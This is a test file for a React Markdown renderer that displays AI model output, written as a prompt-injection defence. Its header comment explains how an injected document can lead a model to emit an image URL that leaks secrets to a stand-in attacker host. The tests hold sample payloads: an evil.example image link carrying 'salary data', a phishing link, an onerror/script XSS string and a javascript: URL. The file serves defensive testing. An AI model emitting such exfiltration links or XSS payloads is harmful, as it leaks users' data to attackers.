import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown } from './markdown';

/**
 * The output layer of the prompt-injection defence.
 *
 * If an injected document does talk the model into emitting a link or an
 * image, the damage depends on what the browser does with it. An image is the
 * dangerous one: `![](https://evil.example/?q=<secret>)` is fetched the moment
 * it renders, with no click, carrying whatever the model put in the URL. This
 * renderer supports neither, so the worst case is visible text. These tests
 * keep it that way.
 */
const html = (text: string) => renderToStaticMarkup(<Markdown text={text} />);

describe('Markdown rendering of model output', () => {
  it('never renders an image, so nothing is fetched on display', () => {
    const out = html('Answer. ![audit](https://evil.example/log?q=salary+data)');
    expect(out).not.toMatch(/<img/i);
  });

  it('never renders a link', () => {
    const out = html('Reset it [here](https://evil.example/reset).');
    expect(out).not.toMatch(/<a[\s>]/i);
    expect(out).not.toMatch(/href=/i);
  });

  it('escapes raw HTML instead of interpreting it', () => {
    const out = html('<img src=x onerror=alert(1)> <script>alert(1)</script>');
    expect(out).not.toMatch(/<img|<script/i);
    expect(out).toContain('&lt;script&gt;');
  });

  it('does not create markup from javascript: URLs', () => {
    const out = html('[click](javascript:alert(1))');
    expect(out).not.toMatch(/href=/i);
  });

  it('keeps inline formatting inert inside code spans', () => {
    const out = html('`<b>x</b>`');
    expect(out).toContain('&lt;b&gt;');
  });

  it('still renders the formatting it does support', () => {
    const out = html('**Eight minutes** [1]\n\n- first\n- second');
    expect(out).toContain('<strong>Eight minutes</strong>');
    expect(out).toMatch(/<ul[^>]*>.*<li/);
  });

  it('hands citation markers to the renderer, in either bracket style', () => {
    const out = renderToStaticMarkup(
      <Markdown
        text={'Rollback takes eight minutes [1] and needs sign-off \u30102\u3011.'}
        renderCitation={(n, key) => <button key={key}>cite-{n}</button>}
      />,
    );
    expect(out).toContain('<button>cite-1</button>');
    expect(out).toContain('<button>cite-2</button>');
  });

  it('renders a gpt-oss marker with a line locator as its citation', () => {
    const out = renderToStaticMarkup(
      <Markdown
        text={'Not refundable【2†L13-L19】.'}
        renderCitation={(n, key) => <button key={key}>cite-{n}</button>}
      />,
    );
    expect(out).toContain('Not refundable<button>cite-2</button>.');
  });

  it('leaves a marker as text when the renderer declines it', () => {
    const out = renderToStaticMarkup(<Markdown text="See [7]." renderCitation={() => null} />);
    expect(out).toContain('See [7].');
  });
});
